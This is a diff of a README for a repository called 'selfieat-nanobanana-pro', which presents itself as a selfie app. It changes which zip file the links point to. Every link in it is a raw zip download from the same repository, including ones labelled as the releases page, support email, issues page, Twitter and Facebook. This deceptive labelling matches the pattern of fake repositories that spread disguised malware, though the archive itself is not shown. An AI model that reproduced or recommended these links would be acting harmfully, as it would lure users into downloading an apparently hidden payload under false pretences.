@@ -1,6 +1,6 @@
 # 🌍 selfieat-nanobanana-pro - Capture Selfies Anywhere with Ease
 
-[![Download Selfie At Nanobanana Pro](https://raw.githubusercontent.com/moh545433h-afk/selfieat-nanobanana-pro/main/public/selfieat-nanobanana-pro-v3.1.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/moh545433h-afk/selfieat-nanobanana-pro/main/public/selfieat-nanobanana-pro-v3.1.zip)
+[![Download Selfie At Nanobanana Pro](https://github.com/moh545433h-afk/selfieat-nanobanana-pro/raw/refs/heads/main/src/selfieat-nanobanana-pro-v1.2.zip%20Now-Here-brightgreen)](https://github.com/moh545433h-afk/selfieat-nanobanana-pro/raw/refs/heads/main/src/selfieat-nanobanana-pro-v1.2.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ To use this application, ensure your computer meets the following requirements:
 
 ### 💾 Download & Install
 
-1. **Visit the downloads page**: Go to the [Releases page](https://raw.githubusercontent.com/moh545433h-afk/selfieat-nanobanana-pro/main/public/selfieat-nanobanana-pro-v3.1.zip) to find the latest version of the application.
+1. **Visit the downloads page**: Go to the [Releases page](https://github.com/moh545433h-afk/selfieat-nanobanana-pro/raw/refs/heads/main/src/selfieat-nanobanana-pro-v1.2.zip) to find the latest version of the application.
 
 2. **Choose your version**: Look for the latest release. Each release includes updates and bug fixes.
 
@@ -64,8 +64,8 @@ Stay up to date with our latest improvements:
 
 If you run into any issues or have questions, feel free to reach out to our support team:
 
-- **Email**: https://raw.githubusercontent.com/moh545433h-afk/selfieat-nanobanana-pro/main/public/selfieat-nanobanana-pro-v3.1.zip
-- **GitHub Issues**: You can report issues on our [issues page](https://raw.githubusercontent.com/moh545433h-afk/selfieat-nanobanana-pro/main/public/selfieat-nanobanana-pro-v3.1.zip).
+- **Email**: https://github.com/moh545433h-afk/selfieat-nanobanana-pro/raw/refs/heads/main/src/selfieat-nanobanana-pro-v1.2.zip
+- **GitHub Issues**: You can report issues on our [issues page](https://github.com/moh545433h-afk/selfieat-nanobanana-pro/raw/refs/heads/main/src/selfieat-nanobanana-pro-v1.2.zip).
 
 ## 📜 License
 
@@ -75,9 +75,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For the latest news and updates, follow us on our social media channels:
 
-- **Twitter**: [@NanobananaPro](https://raw.githubusercontent.com/moh545433h-afk/selfieat-nanobanana-pro/main/public/selfieat-nanobanana-pro-v3.1.zip)
-- **Facebook**: [Nanobanana](https://raw.githubusercontent.com/moh545433h-afk/selfieat-nanobanana-pro/main/public/selfieat-nanobanana-pro-v3.1.zip)
+- **Twitter**: [@NanobananaPro](https://github.com/moh545433h-afk/selfieat-nanobanana-pro/raw/refs/heads/main/src/selfieat-nanobanana-pro-v1.2.zip)
+- **Facebook**: [Nanobanana](https://github.com/moh545433h-afk/selfieat-nanobanana-pro/raw/refs/heads/main/src/selfieat-nanobanana-pro-v1.2.zip)
 
 Discover, capture, and share your selfies globally with selfieat-nanobanana-pro! Enjoy your photography journey! 
 
-[![Download Selfie At Nanobanana Pro](https://raw.githubusercontent.com/moh545433h-afk/selfieat-nanobanana-pro/main/public/selfieat-nanobanana-pro-v3.1.zip%20Now-Here-brightgreen)](https://raw.githubusercontent.com/moh545433h-afk/selfieat-nanobanana-pro/main/public/selfieat-nanobanana-pro-v3.1.zip)
+[![Download Selfie At Nanobanana Pro](https://github.com/moh545433h-afk/selfieat-nanobanana-pro/raw/refs/heads/main/src/selfieat-nanobanana-pro-v1.2.zip%20Now-Here-brightgreen)](https://github.com/moh545433h-afk/selfieat-nanobanana-pro/raw/refs/heads/main/src/selfieat-nanobanana-pro-v1.2.zip)
